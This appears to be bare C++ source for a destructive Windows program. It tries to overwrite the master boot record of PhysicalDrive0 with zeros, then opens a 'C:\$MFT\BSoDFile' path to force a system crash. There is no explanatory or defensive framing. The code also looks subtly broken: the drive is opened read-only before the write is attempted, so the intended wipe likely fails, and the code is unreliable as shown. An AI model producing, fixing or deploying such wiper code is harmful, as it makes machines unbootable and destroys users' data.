#include <windows.h>
#include <iostream>

#define MBR_SIZE 512
#define MFT_SIZE 512 * 1024

using namespace std;

int main() {
    char mbr[MBR_SIZE];
    char mft[MFT_SIZE];

    ZeroMemory(&mbr, MBR_SIZE);
    ZeroMemory(&mft, MFT_SIZE);

    HANDLE MBR = CreateFileW(
        L"\\\\.\\PhysicalDrive0",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    HANDLE MFT = CreateFileW(
        L"C:\\$MFT",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (WriteFile(MBR, mbr, MBR_SIZE, NULL, NULL) == TRUE) {
        if (ReadFile(MFT, mft, MFT_SIZE, NULL, NULL) == TRUE) {
            CloseHandle(MBR);
            CloseHandle(MFT);
            LPCSTR fileName = "C:\\$MFT\\BSoDFile";
            HANDLE hFile = NULL;
            hFile = CreateFileA(fileName, FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, 0, NULL);
            CloseHandle(hFile);
        }
    }
}